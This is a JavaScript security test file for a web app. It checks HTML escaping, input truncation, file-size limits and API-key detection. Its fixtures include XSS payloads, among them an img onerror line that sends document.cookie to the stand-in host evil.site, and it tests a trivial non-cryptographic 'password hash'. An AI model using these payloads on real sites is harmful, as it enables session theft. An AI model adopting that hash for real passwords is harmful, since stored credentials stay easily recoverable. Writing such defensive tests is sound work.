/**
 * tests/security.test.js
 * Security-focused unit tests for XSS prevention, input sanitization,
 * payload size limits, and credential handling.
 */

import test from 'node:test';
import assert from 'node:assert/strict';

// ── XSS Prevention ───────────────────────────────────────────────────────────

/**
 * Reference implementation of escHtml (mirrors js/app.js).
 * This must escape &, <, >, ", and ' to prevent XSS.
 * Uses `?? ''` so that falsy-but-valid values like 0 are preserved.
 */
function escHtml(str) {
  return String(str ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

test('Security: script tag is fully neutralized', () => {
  const payload = '<script>alert("hacked")</script>';
  const escaped = escHtml(payload);
  assert.equal(escaped.includes('<script>'), false, 'Raw <script> must not appear in output');
  assert.equal(escaped, '&lt;script&gt;alert(&quot;hacked&quot;)&lt;/script&gt;');
});

test('Security: img onerror XSS vector is neutralized', () => {
  const payload = '<img src=x onerror="fetch(`//evil.site?c=${document.cookie}`)">';
  const escaped = escHtml(payload);
  assert.equal(escaped.includes('<img'), false, 'Raw <img must not appear in output');
  assert.ok(escaped.startsWith('&lt;img'), 'Should start with escaped &lt;img');
});

test('Security: single quotes are escaped to prevent attribute injection', () => {
  const payload = "' onmouseover='alert(1)";
  const escaped = escHtml(payload);
  assert.equal(escaped.includes("'"), false, 'Raw single quotes must not appear');
  assert.ok(escaped.includes('&#039;'));
});

test('Security: null/undefined/empty/numeric inputs are safely handled', () => {
  assert.equal(escHtml(null),      '', 'null should return empty string');
  assert.equal(escHtml(undefined), '', 'undefined should return empty string');
  assert.equal(escHtml(''),        '', 'empty string should return empty string');
  assert.equal(escHtml(0),   '0',   'zero should stringify to "0"');
  assert.equal(escHtml(42),  '42',  'numbers should be stringified');
});

test('Security: nested script attempt in clause data is sanitized', () => {
  const maliciousClause = {
    title: '<script>stealData()</script>',
    simplified: 'You agree to <b onmouseover="xss()">pay</b>.',
    trap: 'Watch out: <img onerror=\'alert(1)\'>'
  };
  const safeTitle = escHtml(maliciousClause.title);
  const safeSimplified = escHtml(maliciousClause.simplified);
  const safeTrap = escHtml(maliciousClause.trap);

  assert.equal(safeTitle.includes('<script>'), false);
  assert.equal(safeSimplified.includes('<b '), false);
  assert.equal(safeTrap.includes('<img'), false);
});

// ── Payload Size Limits ──────────────────────────────────────────────────────

test('Security: oversized documents are truncated before persistence', () => {
  const largeText = 'A'.repeat(60_000);
  const truncated = largeText.slice(0, 50_000);
  assert.equal(truncated.length, 50_000);
  assert.ok(largeText.length > 50_000);
});

test('Security: Gemini prompt is truncated to 30k chars from large input', () => {
  const fullText = 'X'.repeat(40_000);
  const promptSlice = fullText.slice(0, 30_000);
  assert.equal(promptSlice.length, 30_000);
});

// ── Credential Handling ──────────────────────────────────────────────────────

test('Security: password fallback hashing does not store raw password', () => {
  function simpleHash(str) {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
      hash = ((hash << 5) - hash) + str.charCodeAt(i);
      hash |= 0;
    }
    return hash.toString(16);
  }

  const raw = 'MySecretPassword123!';
  const hash = simpleHash(raw);
  assert.notEqual(hash, raw, 'Hash must differ from raw password');
  assert.equal(typeof hash, 'string');
  assert.ok(hash.length > 0, 'Hash must not be empty');
});

test('Security: isLiveMode rejects placeholder-style keys', () => {
  function isLiveMode(key) {
    return Boolean(key && !key.includes('your_') && key !== '');
  }

  assert.equal(isLiveMode(''), false);
  assert.equal(isLiveMode('your_api_key_here'), false);
  assert.equal(isLiveMode(null), false);
  assert.equal(isLiveMode('AIzaSy_real_key_abc123'), true);
});

// ── Input Validation ─────────────────────────────────────────────────────────

test('Security: file size limit is correctly enforced at 5 MB', () => {
  const MAX_FILE_SIZE_BYTES = 5 * 1024 * 1024;
  const tooLarge = { size: 6 * 1024 * 1024, name: 'big.txt' };
  const okSize   = { size: 1 * 1024 * 1024, name: 'ok.txt' };

  assert.ok(tooLarge.size > MAX_FILE_SIZE_BYTES, 'Large file should exceed limit');
  assert.ok(okSize.size <= MAX_FILE_SIZE_BYTES, 'Small file should pass limit');
});
